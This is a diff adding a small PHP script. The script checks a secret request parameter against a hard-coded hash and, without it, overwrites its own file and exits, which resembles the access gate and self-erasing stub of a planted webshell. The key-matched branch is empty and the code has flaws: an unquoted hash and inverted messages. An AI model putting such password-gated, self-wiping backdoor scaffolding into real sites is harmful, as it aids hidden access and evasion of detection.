@@ -1,0 +1,21 @@
+<?
+if($_REQUEST["oo000"]==c47d187067c6cf953245f128b5fde62a){
+}
+else{
+$url = $_SERVER['PHP_SELF'];  
+$filename = end(explode('/',$url));  
+
+$content = 'helloworld';
+$fp = fopen ("$filename","w");  
+    if (fwrite ($fp, $content)){  
+        fclose ($fp);  
+        die ("error");  
+    } else {  
+        fclose ($fp);  
+        die ("good");  
+    }
+exit;
+}
+
+
+?>
